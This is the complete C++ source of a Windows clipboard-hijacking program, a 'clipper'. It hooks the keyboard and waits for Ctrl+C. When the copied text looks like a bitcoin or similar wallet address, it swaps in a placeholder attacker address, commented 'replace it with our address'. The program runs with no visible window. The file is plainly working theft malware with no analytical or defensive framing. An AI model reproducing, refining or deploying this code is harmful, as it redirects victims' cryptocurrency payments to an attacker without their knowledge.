// Epsi~
#include <Windows.h>
#include <string>

#define WIN32_LEAN_AND_MEAN

void copyToClipboard(std::string str) 
{
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, str.length() + 1);
    memcpy(GlobalLock(hMem), str.c_str(), str.length() + 1);
    GlobalUnlock(hMem);
    OpenClipboard(0);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();
}

char* copyFromClipboard() 
{
	OpenClipboard(nullptr);
	HANDLE hData = GetClipboardData(CF_TEXT);
	char* pszText = static_cast<char*>(GlobalLock(hData));
	GlobalUnlock(hData);
	CloseClipboard();
	return pszText;
}

bool isAdress(char* str) 
{
	if (strlen(str) >= 26 && strlen(str) <= 35)
		if (str[0] == '1' || str[0] == '3' || strstr(str, "bc1") != NULL)
			return true;
	else if (strlen(str) >= 38 && strlen(str) <= 65)
		if (str[0] == '4' || str[0] == '5' || strstr(str, "bc1") != NULL)
			return true;
	return false;
}

HHOOK hKeyboardHook;
__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) // The hook events
{
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) // If any key is pressed down
	{
		// convert the key handle to a readable value
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam); 
		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;
		char lpszKeyName[1024] = { 0 };
		GetKeyNameTextA(dwMsg, (lpszKeyName), 0xFF) + 1;

		if (GetKeyState(VK_CONTROL) == -128 || GetKeyState(VK_CONTROL) == -127) // If control key is pressed
		{
			if (lpszKeyName[0] == 'C') 
			{ // if c key is pressed while control is down
				Sleep(500); // wait for keyboard to be filled with user copy to avoid access of invalid memory
				char* str = copyFromClipboard(); // grab the user copy
				if (isAdress(str) == true) // if it's a bitcoin address
					copyToClipboard("hackersbitcoinaddress"); // replace it with our address
			}

		}
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam); // get ready for the next key press
}

void MessageLoop() // loop that keeps the application active while valid
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD WINAPI hotkey(LPVOID lpParm) // Hooks the keyboard to watch for keypresses
{
	HINSTANCE hInstance = GetModuleHandle(NULL);

	// set the function for the hook
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, hInstance, NULL);

	// Run a loop to keep the application hooked
	MessageLoop();

	// Unhook the application if the messageloop fails(application exit)
	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) 
{
	HANDLE hThread;
	DWORD dwThread;
	DWORD dwtThread;

	// Start a thread for the hook
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)hotkey, NULL, NULL, &dwThread); 

	// Keep the application open
	MessageLoop();
}